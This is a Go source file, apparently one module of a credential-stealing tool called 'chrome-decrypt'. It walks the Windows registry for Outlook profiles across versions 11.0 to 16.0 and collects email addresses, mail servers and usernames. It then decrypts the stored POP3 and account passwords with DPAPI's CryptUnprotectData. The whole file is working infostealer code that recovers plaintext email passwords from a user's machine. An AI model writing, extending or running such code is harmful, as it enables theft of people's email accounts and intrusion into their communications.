package outlook

import (
	"fmt"
	"syscall"
	"unsafe"

	"chrome-decrypt/pkg/credentials"
	"golang.org/x/sys/windows/registry"
)

// Windows API for DPAPI
var (
	crypt32                = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
	procLocalFree          = syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree")
)

// DPAPI structures
type dataBlob struct {
	cbData uint32
	pbData *byte
}

// Extractor implements the credentials.Extractor interface
type Extractor struct {
	verbose bool
}

// NewExtractor creates a new Outlook extractor
func NewExtractor(verbose bool) *Extractor {
	return &Extractor{verbose: verbose}
}

// Extract extracts Microsoft Outlook email account credentials
func (e *Extractor) Extract() (interface{}, error) {
	if e.verbose {
		fmt.Println("[*] Extracting Outlook credentials...")
	}

	var creds []credentials.AppCredential

	// Try different Outlook versions
	outlookVersions := []string{"16.0", "15.0", "14.0", "12.0", "11.0"}
	
	for _, version := range outlookVersions {
		if outlookCreds := e.extractOutlookFromRegistry("Software\\Microsoft\\Office\\"+version+"\\Outlook", version); len(outlookCreds) > 0 {
			creds = append(creds, outlookCreds...)
		}
	}

	if e.verbose {
		fmt.Printf("[+] Found %d Outlook credential entries\n", len(creds))
	}
	return creds, nil
}

// GetType returns the extractor type
func (e *Extractor) GetType() string {
	return "outlook_credentials"
}

// extractOutlookFromRegistry extracts Outlook credentials from registry
func (e *Extractor) extractOutlookFromRegistry(basePath, version string) []credentials.AppCredential {
	var creds []credentials.AppCredential

	// Try to open Outlook profiles key
	profilesPath := basePath + "\\Profiles"
	key, err := registry.OpenKey(registry.CURRENT_USER, profilesPath, registry.READ)
	if err != nil {
		return creds
	}
	defer key.Close()

	profiles, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return creds
	}

	for _, profile := range profiles {
		profileKey, err := registry.OpenKey(key, profile, registry.READ)
		if err != nil {
			continue
		}

		e.extractOutlookAccountsFromProfile(profileKey, profile, version, &creds)
		profileKey.Close()
	}

	return creds
}

// extractOutlookAccountsFromProfile extracts email accounts from an Outlook profile
func (e *Extractor) extractOutlookAccountsFromProfile(profileKey registry.Key, profileName, version string, creds *[]credentials.AppCredential) {
	// Look for account information in various subkeys
	accountPaths := []string{
		"9375CFF0413111d3B88A00104B2A6676",  // Account settings
		"13dbb0c8aa05101a9bb000aa002fc45a",  // Email accounts
	}

	for _, accountPath := range accountPaths {
		accountKey, err := registry.OpenKey(profileKey, accountPath, registry.READ)
		if err != nil {
			continue
		}

		// Enumerate account entries
		if entries, err := accountKey.ReadSubKeyNames(-1); err == nil {
			for _, entry := range entries {
				entryKey, err := registry.OpenKey(accountKey, entry, registry.READ)
				if err != nil {
					continue
				}

				cred := credentials.AppCredential{
					Application: fmt.Sprintf("Outlook %s", version),
					AccountName: profileName,
					Extra:       make(map[string]string),
				}

				// Extract email account details
				if displayName, _, err := entryKey.GetStringValue("Display Name"); err == nil {
					cred.Extra["display_name"] = displayName
				}

				if emailAddr, _, err := entryKey.GetStringValue("Email"); err == nil {
					cred.Email = emailAddr
				}

				if server, _, err := entryKey.GetStringValue("POP3 Server"); err == nil {
					cred.Server = server
					cred.Protocol = "POP3"
				} else if server, _, err := entryKey.GetStringValue("IMAP Server"); err == nil {
					cred.Server = server
					cred.Protocol = "IMAP"
				} else if server, _, err := entryKey.GetStringValue("SMTP Server"); err == nil {
					cred.Extra["smtp_server"] = server
				}

				if username, _, err := entryKey.GetStringValue("User Name"); err == nil {
					cred.Username = username
				}

				// Try to decrypt password
				if passwordData, _, err := entryKey.GetBinaryValue("Password"); err == nil {
					if decrypted := e.dpapiDecrypt(passwordData); decrypted != nil {
						cred.Password = e.handlePasswordEncoding(decrypted)
					}
				}

				// Try alternative password fields
				if cred.Password == "" {
					if passwordData, _, err := entryKey.GetBinaryValue("POP3 Password"); err == nil {
						if decrypted := e.dpapiDecrypt(passwordData); decrypted != nil {
							cred.Password = e.handlePasswordEncoding(decrypted)
						}
					}
				}

				if cred.Email != "" || cred.Username != "" || cred.Server != "" {
					*creds = append(*creds, cred)
				}

				entryKey.Close()
			}
		}

		accountKey.Close()
	}
}

// dpapiDecrypt decrypts data using Windows DPAPI
func (e *Extractor) dpapiDecrypt(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	var outBlob dataBlob
	inBlob := dataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil
	}

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 20]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	return decrypted
}

// handlePasswordEncoding handles various password encodings from Windows credentials
func (e *Extractor) handlePasswordEncoding(data []byte) string {
	if len(data) == 0 {
		return ""
	}

	// Check if data appears to be UTF-16 (common for Windows credentials)
	if len(data)%2 == 0 && len(data) >= 2 {
		// Convert byte slice to uint16 slice for UTF-16 decoding
		utf16Data := make([]uint16, len(data)/2)
		for i := 0; i < len(utf16Data); i++ {
			utf16Data[i] = uint16(data[i*2]) | uint16(data[i*2+1])<<8
		}

		// Remove null terminator if present
		if len(utf16Data) > 0 && utf16Data[len(utf16Data)-1] == 0 {
			utf16Data = utf16Data[:len(utf16Data)-1]
		}

		// Convert UTF-16 to string
		if decoded := syscall.UTF16ToString(utf16Data); decoded != "" {
			return decoded
		}
	}

	// Fallback to treating as ASCII/UTF-8
	// Remove null bytes that might be present
	var result []byte
	for _, b := range data {
		if b != 0 {
			result = append(result, b)
		}
	}

	return string(result)
}
